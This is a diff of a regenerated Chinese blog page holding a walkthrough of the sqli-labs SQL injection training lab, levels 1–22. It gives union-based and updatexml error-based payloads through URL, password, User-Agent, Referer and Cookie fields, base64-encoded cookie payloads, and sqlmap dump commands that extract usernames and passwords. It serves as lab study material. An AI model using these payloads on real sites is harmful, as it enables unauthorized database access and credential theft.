@@ -15,16 +15,25 @@
   
   <link rel="shortcut icon" href="/favicon.ico" />
   
-  <link rel="stylesheet" href="/dist/main.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
-  <link rel="stylesheet" href="/css/custom.css">
   
-  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
   
   
 
   
 
+<link rel="alternate" href="/atom.xml" title="心是看客心，人是戏中人" type="application/atom+xml">
 </head>
 
 </html>
@@ -89,7 +98,7 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p><a href="http://43.247.91.228:84" target="_blank" rel="noopener">sqli-labs网址链接</a></p>
+  <p><a target="_blank" rel="noopener" href="http://43.247.91.228:84/">sqli-labs网址链接</a></p>
 <h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><strong>方法一：</strong><br>输入?id=1正常显示，输入?id=1’报错，输入?id=1’ and 1=’1，正常显示，得知是字符型注入，<br>爆字段： <code>?id=1&#39; order by 3--+</code><br>查看回显内容：<code>?id=-1‘ union select 1,2,3--+</code><br>爆库名，版本号：<code>？id=-1&#39; union select 1,database(),version()</code><br>爆所有数据库：<code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code><br>爆表名：<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23</code><br>爆列名：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code><br>爆数据：<code>?id=-1&#39; union select 1,2,group_concat(id,username,password) from users%23</code></p>
 <p><strong>方法二：</strong><br>借助sqlmap软件直接爆破<br>最终payload：<code>./sqlmap.py -u &quot;http://43.247.91.228:84/Less-1/?id=1&quot;  -D security -T users --dump</code><br>得到的数据结果如下：<br><img src="https://s2.ax1x.com/2019/02/27/kTWpG9.png" alt="获取数据"></p>
 <h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>输入1’，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1 union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
@@ -109,11 +118,11 @@
 <h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>通过尝试发现闭合方式为 “)，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图<br><img src="https://s2.ax1x.com/2019/03/06/kvBlO1.png" alt="判断库名的第一个字符为s"><br>返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。</p>
 <h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于<code>update table set password=&#39;xxx&#39; where username = &#39;xxx&#39;</code>,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，<br>在密码栏里写入：<code>1&#39; order by 3#</code> ，报错了。试一下报错注入，<br>在密码栏里输入：<code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，成果爆出库名，<br>爆表名：密码栏输入<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#</code>,<br>爆列名：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1)#</code>。</p>
 <p>sqlmap也可以跑出来数据库和表，参数的payload：<code>--data=&quot;uname=admin&amp;passwd=*&quot; -D security -T tables --dump</code>。</p>
-<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。<br>根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1’ 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 <strong>INSERT INTO table_name (‘uagent’,’ip_address’,’username’) VALUES (‘\$uagent’,’\$IP’,’$uname’)</strong>，需要构造注入语句，还要满足闭合条件,<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQFB9.png" alt="修改User-Agent"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。<br>根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1’ 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 **INSERT INTO table_name (‘uagent’,’ip_address’,’username’) VALUES (‘$uagent’,’$IP’,’$uname’)**，需要构造注入语句，还要满足闭合条件,<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQFB9.png" alt="修改User-Agent"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
 <h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>与less-18类似，根据提示是Referer注入，成功登陆后bp抓包，修改Referer内容。<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQg3T.png" alt="修改Referer"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
-<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。<br>爆库名：<code>uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxNiuV.png" alt="修改Cookie"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
-<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>按less-20的方法成功登陆后，发现页面和less-20有一些不同，<br><img src="https://s2.ax1x.com/2019/03/07/kxN4bT.png" alt="base64编码"><br>uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。<br>需要把注入字段进行base64加密，其他方法和less-20一样。<br>爆库注入字段：<code>uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br>注入字段base64编码：<code>uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxNq2R.png" alt="修改Cookie，并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
-<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和less-21类似，根据题目提示闭合方式是 “ ，其他方法和less-21一样。<br>爆库注入字段：<code>uname=&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&quot;1</code><br>注入字段base64编码：<code>uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxUHw8.png" alt="修改Cookie并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。<br>爆库名：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxNiuV.png" alt="修改Cookie"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>按less-20的方法成功登陆后，发现页面和less-20有一些不同，<br><img src="https://s2.ax1x.com/2019/03/07/kxN4bT.png" alt="base64编码"><br>uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。<br>需要把注入字段进行base64加密，其他方法和less-20一样。<br>爆库注入字段：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br>注入字段base64编码：<code>uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxNq2R.png" alt="修改Cookie，并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和less-21类似，根据题目提示闭合方式是 “ ，其他方法和less-21一样。<br>爆库注入字段：<code> uname=&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&quot;1</code><br>注入字段base64编码：<code>uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxUHw8.png" alt="修改Cookie并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
 <p><strong><em>sqli-labs(1~22)关卡全部完成了，如有错误，欢迎在评论中指出!</em></strong></p>
  
       <!-- reward -->
@@ -206,7 +215,7 @@
       </a>
     
     
-      <a href="/2019/02/20/网络安全实验室--上传关/" class="article-nav-link">
+      <a href="/2019/02/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4--%E4%B8%8A%E4%BC%A0%E5%85%B3/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
         <div class="article-nav-title">网络安全实验室--上传关</div>
       </a>
@@ -223,11 +232,11 @@
 <script>
   new Valine({
     el: "#vcomments",
-    app_id: "",
-    app_key: "",
+    app_id: "ds54farWshFsUraKxWRVVf4G-gzGzoHsz",
+    app_key: "q4rgias5HDeq09ugweytekJQ",
     path: window.location.pathname,
-    avatar: "mp",
-    placeholder: "Add some comments to my article~",
+    avatar: "monsterid",
+    placeholder: "",
     recordIP: true,
   });
   const infoEle = document.querySelector("#vcomments .info");
@@ -408,11 +417,17 @@
     
   </div>
 </div>
-    <script src="/js/jquery-2.0.3.min.js"></script>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
 <script src="/js/lazyload.min.js"></script>
+
 <!-- Tocbot -->
 
+
 <script src="/js/tocbot.min.js"></script>
+
 <script>
   tocbot.init({
     tocSelector: '.tocbot',
@@ -430,7 +445,9 @@
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
 <script src="/dist/main.js"></script>
+
 <!-- ImageViewer -->
 
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
@@ -546,7 +563,9 @@
 
 <!-- busuanzi  -->
 
+
 <script src="/js/busuanzi-2.3.pure.min.js"></script>
+
 
 <!-- ClickLove -->
 
@@ -554,11 +573,15 @@
 
 <!-- ClickBoom2 -->
 
+
 <script src="/js/clickBoom2.js"></script>
+
 
 <!-- CodeCopy -->
 
+
 <link rel="stylesheet" href="/css/clipboard.css">
+
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 <script>
   function wait(callback, seconds) {
@@ -617,7 +640,9 @@
 
 <!-- CanvasBackground -->
 
+
 <script src="/js/dz.js"></script>
+
 
 
     
